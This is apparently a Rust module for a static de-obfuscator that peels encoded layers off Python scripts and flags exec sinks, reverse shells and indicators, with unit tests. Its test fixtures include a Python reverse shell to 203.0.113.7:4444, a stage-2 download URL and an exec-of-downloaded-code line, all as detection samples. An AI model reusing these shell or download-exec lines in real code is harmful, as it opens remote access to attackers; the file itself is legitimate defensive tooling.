//! Script decoder orchestration. Starting from the pasted source, each layer
//! is tokenized and scanned for decode chains and code sinks (`exec`,
//! `eval`, `compile`). Every payload found becomes a new layer, which is
//! scanned in turn, breadth first, up to [`MAX_DEPTH`] deep. Indicators and
//! heuristic flags are collected from every text layer.
//!
//! Nothing here executes the input. Decoding is static evaluation of a small
//! expression subset (see `eval`), with bounded work and output.

use std::collections::hash_map::DefaultHasher;
use std::collections::{HashMap, VecDeque};
use std::hash::{Hash, Hasher};

use serde::Serialize;
use thiserror::Error;

use super::codecs;
use super::eval::{Binding, Env, Eval, SINKS, V};
use super::flags::{self, Flag, Level};
use super::ioc::{Collector, Ioc};
use super::lexer::{Tok, Token, tokenize};

/// Largest input accepted.
pub const MAX_INPUT: usize = 2_000_000;
/// Most layers produced.
pub const MAX_LAYERS: usize = 32;
/// Deepest nesting followed.
pub const MAX_DEPTH: usize = 10;
/// Most text returned per layer for display; analysis uses the full text.
const MAX_SHOWN: usize = 1_000_000;
/// Bytes of a binary layer shown as a hex dump.
const HEX_DUMP_BYTES: usize = 4096;
/// Most printable strings listed for a binary layer.
const MAX_STRINGS: usize = 500;
/// Smallest payload worth a layer.
const MIN_PAYLOAD: usize = 4;

#[derive(Debug, Error, PartialEq, Eq)]
pub enum DecodeError {
    #[error("paste a script or open a file")]
    Empty,
    #[error("input is too large ({got} bytes, limit {limit})")]
    TooLarge { got: usize, limit: usize },
}

#[derive(Debug, Clone, Copy, Serialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum LayerKind {
    /// The pasted input.
    Source,
    /// Decoded text (usually more Python).
    Text,
    /// Decoded bytes that are not text.
    Binary,
    /// Bytes handed to `marshal.loads` (Python bytecode).
    Marshal,
}

#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct Layer {
    pub index: usize,
    pub parent: Option<usize>,
    pub depth: usize,
    pub kind: LayerKind,
    /// How it was produced, such as `base64 > zlib`.
    pub method: String,
    /// Code sink that runs it, such as `exec`.
    pub sink: Option<String>,
    /// Line in the parent where it was found.
    pub line: Option<usize>,
    /// Text, or a hex dump for binary layers.
    pub text: String,
    /// Printable strings, for binary and marshal layers.
    pub strings: Vec<String>,
    /// Size of the decoded content in bytes.
    pub size: usize,
    /// True when `text` was shortened for display.
    pub truncated: bool,
}

#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct DecodeResult {
    pub layers: Vec<Layer>,
    pub iocs: Vec<Ioc>,
    /// Most severe first.
    pub flags: Vec<Flag>,
    pub notes: Vec<String>,
}

/// A payload found in one layer.
struct Found {
    line: usize,
    sink: Option<String>,
    steps: Vec<String>,
    value: V,
}

/// Decoded content ready to become a layer.
enum Content {
    Text(String),
    Binary(Vec<u8>),
    Marshal(Vec<u8>),
}

impl Content {
    fn bytes(&self) -> &[u8] {
        match self {
            Content::Text(s) => s.as_bytes(),
            Content::Binary(b) | Content::Marshal(b) => b,
        }
    }
}

fn digest(b: &[u8]) -> u64 {
    let mut h = DefaultHasher::new();
    b.hash(&mut h);
    h.finish()
}

/// Mostly printable text (allowing common whitespace).
fn is_texty(s: &str) -> bool {
    if s.is_empty() {
        return false;
    }
    let total = s.chars().count();
    let bad = s
        .chars()
        .filter(|c| (c.is_control() && !matches!(c, '\n' | '\r' | '\t')) || *c == '\u{fffd}')
        .count();
    bad * 10 < total
}

fn materialize(v: V) -> Option<Content> {
    match v {
        V::Str(s) if s.len() >= MIN_PAYLOAD => Some(Content::Text(s)),
        V::Bytes(b) if b.len() >= MIN_PAYLOAD => match String::from_utf8(b) {
            Ok(s) if is_texty(&s) => Some(Content::Text(s)),
            Ok(s) => Some(Content::Binary(s.into_bytes())),
            Err(e) => Some(Content::Binary(e.into_bytes())),
        },
        V::Marshal(b) if b.len() >= MIN_PAYLOAD => Some(Content::Marshal(b)),
        _ => None,
    }
}

/// Printable ASCII runs of at least four characters, like `strings`.
fn strings_of(b: &[u8]) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = Vec::new();
    for &c in b.iter().chain(std::iter::once(&0u8)) {
        if (0x20..0x7f).contains(&c) || c == b'\t' {
            cur.push(c);
        } else {
            if cur.len() >= 4 {
                out.push(String::from_utf8_lossy(&cur).into_owned());
                if out.len() >= MAX_STRINGS {
                    break;
                }
            }
            cur.clear();
        }
    }
    out
}

fn hex_dump(b: &[u8]) -> String {
    let mut out = String::new();
    for (row, chunk) in b.chunks(16).take(HEX_DUMP_BYTES / 16).enumerate() {
        let hex: Vec<String> = chunk.iter().map(|x| format!("{x:02x}")).collect();
        let ascii: String = chunk
            .iter()
            .map(|&x| {
                if (0x20..0x7f).contains(&x) {
                    x as char
                } else {
                    '.'
                }
            })
            .collect();
        out.push_str(&format!(
            "{:08x}  {:<47}  |{ascii}|\n",
            row * 16,
            hex.join(" ")
        ));
    }
    if b.len() > HEX_DUMP_BYTES {
        out.push_str(&format!("... {} more bytes\n", b.len() - HEX_DUMP_BYTES));
    }
    out
}

/// A layer of text that is itself one bare base64 blob.
fn bare_base64(s: &str) -> Option<Vec<u8>> {
    let t = s.trim();
    if t.len() < 40
        || !t
            .bytes()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, b'+' | b'/' | b'=' | b'\n' | b'\r'))
    {
        return None;
    }
    if t.bytes()
        .filter(|c| c.is_ascii_digit() || c.is_ascii_uppercase())
        .count()
        * 5
        < t.len()
    {
        // Mostly lowercase words are prose, not base64.
        return None;
    }
    codecs::b64(t.as_bytes(), false).filter(|b| b.len() >= MIN_PAYLOAD)
}

/// Bytes that start with a compression header and inflate.
fn auto_decompress(b: &[u8]) -> Option<(Vec<u8>, &'static str)> {
    if b.starts_with(&[0x1f, 0x8b]) {
        codecs::gunzip(b).map(|o| (o, "gzip (auto)"))
    } else if b.starts_with(&[0xfd, b'7', b'z', b'X', b'Z', 0x00]) {
        codecs::unlzma(b).map(|o| (o, "xz (auto)"))
    } else if b.len() > 2 && b[0] == 0x78 && matches!(b[1], 0x01 | 0x5e | 0x9c | 0xda) {
        codecs::inflate(b).map(|o| (o, "zlib (auto)"))
    } else {
        None
    }
}

fn is_op(t: &Token, op: &str) -> bool {
    matches!(&t.tok, Tok::Op(o) if *o == op)
}

/// Record `import a as b`, `import a.b` and `from a import b as c`.
fn imports(line: &[Token], env: &mut Env) {
    let names: Vec<Option<&str>> = line
        .iter()
        .map(|t| match &t.tok {
            Tok::Name(n) => Some(n.as_str()),
            _ => None,
        })
        .collect();
    let dotted = |from: usize| -> (String, usize) {
        let mut s = String::new();
        let mut k = from;
        while let Some(Some(n)) = names.get(k) {
            if !s.is_empty() {
                s.push('.');
            }
            s.push_str(n);
            if line.get(k + 1).is_some_and(|t| is_op(t, ".")) {
                k += 2;
            } else {
                k += 1;
                break;
            }
        }
        (s, k)
    };
    match names.first() {
        Some(Some("import")) => {
            let mut k = 1;
            while k < line.len() {
                let (module, next) = dotted(k);
                if module.is_empty() {
                    break;
                }
                k = next;
                let local = if names.get(k) == Some(&Some("as")) {
                    k += 2;
                    names
                        .get(k - 1)
                        .copied()
                        .flatten()
                        .unwrap_or("")
                        .to_string()
                } else {
                    module.split('.').next().unwrap_or("").to_string()
                };
                if !local.is_empty() {
                    let target = if local.contains('.') || names.get(k - 2) == Some(&Some("as")) {
                        module.clone()
                    } else {
                        module.split('.').next().unwrap_or("").to_string()
                    };
                    env.aliases.insert(local, target);
                }
                if line.get(k).is_some_and(|t| is_op(t, ",")) {
                    k += 1;
                } else {
                    break;
                }
            }
        }
        Some(Some("from")) => {
            let (module, mut k) = dotted(1);
            if names.get(k) != Some(&Some("import")) {
                return;
            }
            k += 1;
            if line.get(k).is_some_and(|t| is_op(t, "(")) {
                k += 1;
            }
            while let Some(Some(name)) = names.get(k) {
                let mut local = *name;
                k += 1;
                if names.get(k) == Some(&Some("as")) {
                    if let Some(Some(a)) = names.get(k + 1) {
                        local = a;
                    }
                    k += 2;
                }
                env.aliases
                    .insert(local.to_string(), format!("{module}.{name}"));
                if line.get(k).is_some_and(|t| is_op(t, ",")) {
                    k += 1;
                } else {
                    break;
                }
            }
        }
        _ => {}
    }
}

/// Names worth starting a candidate evaluation at.
fn worth(name: &str, env: &Env) -> bool {
    SINKS.contains(&name)
        || env.aliases.contains_key(name)
        || matches!(
            name,
            "base64"
                | "binascii"
                | "codecs"
                | "zlib"
                | "gzip"
                | "lzma"
                | "bz2"
                | "marshal"
                | "bytes"
                | "bytearray"
                | "__import__"
                | "importlib"
                | "getattr"
                | "builtins"
        )
}

/// Scan one layer of source for payloads.
fn analyze(text: &str, notes: &mut Vec<String>) -> Vec<Found> {
    let toks = tokenize(text);
    let mut env = Env::default();
    let mut found = Vec::new();
    let mut i = 0;
    while i < toks.len() {
        let mut e = i;
        while e < toks.len() && toks[e].tok != Tok::Newline {
            e += 1;
        }
        imports(&toks[i..e], &mut env);

        let mut k = i;
        while k < e {
            let start_ok = matches!(&toks[k].tok, Tok::Name(n) if worth(n, &env))
                && !(k > i && is_op(&toks[k - 1], "."));
            if start_ok {
                let o = Eval::new(&toks, &env).run_postfix(k);
                notes.extend(o.notes.iter().cloned());
                let payload = matches!(o.value, V::Str(_) | V::Bytes(_) | V::Marshal(_));
                if o.sink.is_some() || (payload && !o.steps.is_empty()) {
                    found.push(Found {
                        line: toks[k].line,
                        sink: o.sink,
                        steps: o.steps,
                        value: o.value,
                    });
                    k = o.end.max(k + 1);
                    continue;
                }
            }
            k += 1;
        }

        // Simple assignments feed later lines: `x = ...` and `x += ...`.
        if e >= i + 3
            && let Tok::Name(name) = &toks[i].tok
        {
            let plus = is_op(&toks[i + 1], "+=");
            if is_op(&toks[i + 1], "=") || plus {
                let o = Eval::new(&toks, &env).run(i + 2);
                let mut binding = Binding {
                    value: o.value,
                    steps: o.steps,
                };
                if plus && let Some(prev) = env.vars.get(name) {
                    binding.value = match (prev.value.clone(), binding.value) {
                        (V::Str(a), V::Str(b)) => V::Str(a + &b),
                        (V::Bytes(mut a), V::Bytes(b)) => {
                            a.extend(b);
                            V::Bytes(a)
                        }
                        _ => V::Unknown,
                    };
                    let mut steps = prev.steps.clone();
                    steps.extend(binding.steps);
                    binding.steps = steps;
                }
                env.vars.insert(name.clone(), binding);
            }
        }
        i = e + 1;
    }
    found
}

struct Builder {
    layers: Vec<Layer>,
    /// Full content of each layer, for scanning.
    contents: Vec<Content>,
    seen: HashMap<u64, usize>,
    flags: Vec<Flag>,
    notes: Vec<String>,
    queue: VecDeque<usize>,
}

impl Builder {
    /// Add a layer unless its content was already seen. Returns its index,
    /// and whether it is new.
    fn add(
        &mut self,
        content: Content,
        parent: Option<usize>,
        method: String,
        sink: Option<String>,
        line: Option<usize>,
    ) -> Option<(usize, bool)> {
        let h = digest(content.bytes());
        if let Some(&idx) = self.seen.get(&h) {
            // The same payload found again, now with a sink: record it.
            if sink.is_some() && self.layers[idx].sink.is_none() {
                self.layers[idx].sink = sink;
            }
            return Some((idx, false));
        }
        if self.layers.len() >= MAX_LAYERS {
            if !self.notes.iter().any(|n| n.starts_with("Layer limit")) {
                self.notes.push(format!(
                    "Layer limit ({MAX_LAYERS}) reached; later payloads were not decoded."
                ));
            }
            return None;
        }
        let depth = parent.map(|p| self.layers[p].depth + 1).unwrap_or(0);
        let (kind, text, strings, size) = match &content {
            Content::Text(s) => {
                let kind = if parent.is_none() {
                    LayerKind::Source
                } else {
                    LayerKind::Text
                };
                (kind, s.clone(), Vec::new(), s.len())
            }
            Content::Binary(b) => (LayerKind::Binary, hex_dump(b), strings_of(b), b.len()),
            Content::Marshal(b) => (LayerKind::Marshal, hex_dump(b), strings_of(b), b.len()),
        };
        let truncated = text.len() > MAX_SHOWN;
        let text = if truncated {
            let mut cut = MAX_SHOWN;
            while !text.is_char_boundary(cut) {
                cut -= 1;
            }
            text[..cut].to_string()
        } else {
            text
        };
        let index = self.layers.len();
        self.layers.push(Layer {
            index,
            parent,
            depth,
            kind,
            method,
            sink,
            line,
            text,
            strings,
            size,
            truncated,
        });
        self.contents.push(content);
        self.seen.insert(h, index);
        self.queue.push_back(index);
        Some((index, true))
    }

    /// Decode children of one layer.
    fn expand(&mut self, idx: usize) {
        let depth = self.layers[idx].depth;
        if depth >= MAX_DEPTH {
            self.notes.push(format!(
                "Layer {idx} is at the depth limit ({MAX_DEPTH}); it was not decoded further."
            ));
            return;
        }
        match &self.contents[idx] {
            Content::Text(text) => {
                let text = text.clone();
                let mut notes = Vec::new();
                let found = analyze(&text, &mut notes);
                for n in notes {
                    if !self.notes.contains(&n) {
                        self.notes.push(n);
                    }
                }
                for f in found {
                    let src_line = text
                        .lines()
                        .nth(f.line.saturating_sub(1))
                        .unwrap_or("")
                        .to_string();
                    let steps = if f.steps.is_empty() {
                        "literal".to_string()
                    } else {
                        f.steps.join(" > ")
                    };
                    let Some(content) = materialize(f.value) else {
                        if let Some(sink) = &f.sink {
                            self.flags.push(Flag {
                                level: Level::Warn,
                                rule: "exec-unresolved",
                                title: "Executes code that could not be decoded",
                                detail: format!(
                                    "{sink}() at line {} runs an expression this decoder cannot evaluate statically. Review it by hand.",
                                    f.line
                                ),
                                layer: idx,
                                line: Some(f.line),
                                snippet: src_line.trim().chars().take(160).collect(),
                            });
                        }
                        continue;
                    };
                    let method = match &f.sink {
                        Some(s) => format!("{s}({steps})"),
                        None => steps.clone(),
                    };
                    if let Some((child, _)) =
                        self.add(content, Some(idx), method, f.sink.clone(), Some(f.line))
                        && let Some(sink) = &f.sink
                        && !self.flags.iter().any(|x| {
                            x.rule == "exec-decoded" && x.layer == idx && x.line == Some(f.line)
                        })
                    {
                        self.flags.push(flags::exec_flag(
                            sink, child, idx, f.line, &steps, &src_line,
                        ));
                    }
                }
                // A decoded layer that is just a base64 blob.
                if idx > 0
                    && let Some(b) = bare_base64(&text)
                    && let Some(c) = materialize(V::Bytes(b))
                {
                    self.add(c, Some(idx), "base64 (auto)".to_string(), None, None);
                }
            }
            Content::Binary(b) => {
                if let Some((out, how)) = auto_decompress(b)
                    && let Some(c) = materialize(V::Bytes(out))
                {
                    self.add(c, Some(idx), how.to_string(), None, None);
                }
            }
            Content::Marshal(_) => {
                if !self.notes.iter().any(|n| n.starts_with("marshal")) {
                    self.notes.push(
                        "marshal bytecode is shown as a hex dump and strings; it is not disassembled.".to_string(),
                    );
                }
            }
        }
    }
}

/// Decode a script.
pub fn decode(src: &str) -> Result<DecodeResult, DecodeError> {
    if src.trim().is_empty() {
        return Err(DecodeError::Empty);
    }
    if src.len() > MAX_INPUT {
        return Err(DecodeError::TooLarge {
            got: src.len(),
            limit: MAX_INPUT,
        });
    }
    let mut b = Builder {
        layers: Vec::new(),
        contents: Vec::new(),
        seen: HashMap::new(),
        flags: Vec::new(),
        notes: Vec::new(),
        queue: VecDeque::new(),
    };
    b.add(
        Content::Text(src.to_string()),
        None,
        "input".to_string(),
        None,
        None,
    );
    while let Some(idx) = b.queue.pop_front() {
        b.expand(idx);
    }

    let mut iocs = Collector::default();
    for (idx, c) in b.contents.iter().enumerate() {
        match c {
            Content::Text(t) => {
                iocs.scan(t, idx);
                b.flags.extend(flags::scan(t, idx));
            }
            Content::Binary(_) | Content::Marshal(_) => {
                let joined = b.layers[idx].strings.join("\n");
                iocs.scan(&joined, idx);
                b.flags.extend(flags::scan(&joined, idx));
            }
        }
    }
    b.flags
        .sort_by(|x, y| y.level.cmp(&x.level).then(x.layer.cmp(&y.layer)));

    Ok(DecodeResult {
        layers: b.layers,
        iocs: iocs.iocs,
        flags: b.flags,
        notes: b.notes,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use base64::Engine as _;
    use std::io::Write;

    fn b64(s: &[u8]) -> String {
        base64::engine::general_purpose::STANDARD.encode(s)
    }

    fn zlib(s: &[u8]) -> Vec<u8> {
        let mut z = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
        z.write_all(s).unwrap();
        z.finish().unwrap()
    }

    const INNER: &str = "import socket,os,pty\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('203.0.113.7',4444))\nos.dup2(s.fileno(),0)\npty.spawn('/bin/sh')\n";

    fn texts(r: &DecodeResult) -> Vec<&str> {
        r.layers.iter().map(|l| l.text.as_str()).collect()
    }

    #[test]
    fn empty_and_too_large() {
        assert_eq!(decode("  \n"), Err(DecodeError::Empty));
        assert!(matches!(
            decode(&"a".repeat(MAX_INPUT + 1)),
            Err(DecodeError::TooLarge { .. })
        ));
    }

    #[test]
    fn exec_base64_zlib() {
        let src = format!(
            "import base64,zlib\nexec(zlib.decompress(base64.b64decode('{}')))",
            b64(&zlib(INNER.as_bytes()))
        );
        let r = decode(&src).unwrap();
        assert_eq!(r.layers.len(), 2);
        let l = &r.layers[1];
        assert_eq!(l.text, INNER);
        assert_eq!(l.method, "exec(base64 > zlib)");
        assert_eq!(l.sink.as_deref(), Some("exec"));
        assert_eq!(l.line, Some(2));
        assert_eq!(l.parent, Some(0));
        assert!(
            r.flags
                .iter()
                .any(|f| f.rule == "exec-decoded" && f.layer == 0)
        );
        assert!(
            r.flags
                .iter()
                .any(|f| f.rule == "reverse-shell" && f.layer == 1)
        );
        assert!(
            r.iocs
                .iter()
                .any(|i| i.value == "203.0.113.7" && i.layer == 1)
        );
        // Most severe first.
        assert_eq!(r.flags[0].level, Level::Fail);
    }

    #[test]
    fn variables_and_aliases_across_lines() {
        let src = format!(
            "import base64 as b\nfrom zlib import decompress as dz\np = '{}'\nq = dz(b.b64decode(p))\nexec(q)",
            b64(&zlib(b"print('hi from layer 1')"))
        );
        let r = decode(&src).unwrap();
        assert_eq!(texts(&r)[1], "print('hi from layer 1')");
        // Found on the assignment line first, then marked as executed.
        assert_eq!(r.layers[1].sink.as_deref(), Some("exec"));
        assert_eq!(r.layers.len(), 2);
    }

    #[test]
    fn nested_layers() {
        let l2 = "print('deepest')";
        let l1 = format!(
            "import base64\nexec(base64.b64decode('{}'))",
            b64(l2.as_bytes())
        );
        let src = format!(
            "exec(__import__('base64').b64decode('{}'))",
            b64(l1.as_bytes())
        );
        let r = decode(&src).unwrap();
        assert_eq!(r.layers.len(), 3);
        assert_eq!(r.layers[2].text, l2);
        assert_eq!(r.layers[2].depth, 2);
        assert_eq!(r.layers[2].parent, Some(1));
    }

    #[test]
    fn chr_join_and_reverse() {
        let codes: Vec<String> = "import os".bytes().map(|b| b.to_string()).collect();
        let src = format!(
            "exec(''.join(chr(c) for c in [{}]))\nexec(')1(tnirp'[::-1])",
            codes.join(",")
        );
        let r = decode(&src).unwrap();
        let t = texts(&r);
        assert!(t.contains(&"import os"));
        assert!(t.contains(&"print(1)"));
        let methods: Vec<&str> = r.layers.iter().map(|l| l.method.as_str()).collect();
        assert!(
            methods.contains(&"exec(join)") && methods.contains(&"exec(reverse)"),
            "{methods:?}"
        );
    }

    #[test]
    fn plus_equals_accumulates() {
        let enc = b64(b"print('pieces')");
        let (a, c) = enc.split_at(6);
        let src = format!("import base64\nx = '{a}'\nx += '{c}'\nexec(base64.b64decode(x))");
        let r = decode(&src).unwrap();
        assert_eq!(texts(&r)[1], "print('pieces')");
    }

    #[test]
    fn marshal_layer_lists_strings() {
        let mut payload = vec![0xe3, 0, 0, 0];
        payload.extend_from_slice(b"\x00\x00http://203.0.113.9/stage2\x00\x01\x02");
        let src = format!(
            "import marshal,base64\nexec(marshal.loads(base64.b64decode('{}')))",
            b64(&payload)
        );
        let r = decode(&src).unwrap();
        let m = &r.layers[1];
        assert_eq!(m.kind, LayerKind::Marshal);
        assert!(
            m.strings
                .iter()
                .any(|s| s.contains("http://203.0.113.9/stage2"))
        );
        assert!(
            r.iocs
                .iter()
                .any(|i| i.value == "http://203.0.113.9/stage2")
        );
        assert!(r.notes.iter().any(|n| n.starts_with("marshal")));
    }

    #[test]
    fn unresolved_exec_is_flagged() {
        let r = decode("import requests\nexec(requests.get(u).text)").unwrap();
        assert_eq!(r.layers.len(), 1);
        assert!(r.flags.iter().any(|f| f.rule == "exec-unresolved"));
        assert!(r.flags.iter().any(|f| f.rule == "download-exec"));
    }

    #[test]
    fn auto_base64_and_zlib() {
        // A decoded layer that is itself base64 of zlib data.
        let inner = b64(&zlib(b"print('auto layers')"));
        let src = format!(
            "import codecs\nexec(codecs.decode('{}', 'rot13'))",
            codecs::rot13(&inner)
        );
        let r = decode(&src).unwrap();
        let t = texts(&r);
        assert!(
            t.contains(&"print('auto layers')"),
            "{:?}",
            r.layers.iter().map(|l| &l.method).collect::<Vec<_>>()
        );
    }

    #[test]
    fn clean_script_has_one_layer_and_no_flags() {
        let r = decode("def add(a, b):\n    return a + b\n\nprint(add(2, 3))\n").unwrap();
        assert_eq!(r.layers.len(), 1);
        assert!(r.flags.is_empty());
        assert!(r.iocs.is_empty());
    }

    #[test]
    fn self_referencing_payload_terminates() {
        // A payload that decodes to itself would loop without dedupe.
        let r = decode("import base64\nexec(base64.b64decode('aW1wb3J0IGJhc2U2NA=='))").unwrap();
        assert!(r.layers.len() <= MAX_LAYERS);
    }

    #[test]
    fn layer_and_depth_limits() {
        let mut s = "print('bottom')".to_string();
        for _ in 0..15 {
            s = format!(
                "import base64\nexec(base64.b64decode('{}'))",
                b64(s.as_bytes())
            );
        }
        let r = decode(&s).unwrap();
        assert!(r.layers.iter().all(|l| l.depth <= MAX_DEPTH));
        assert!(r.notes.iter().any(|n| n.contains("depth limit")));
    }
}
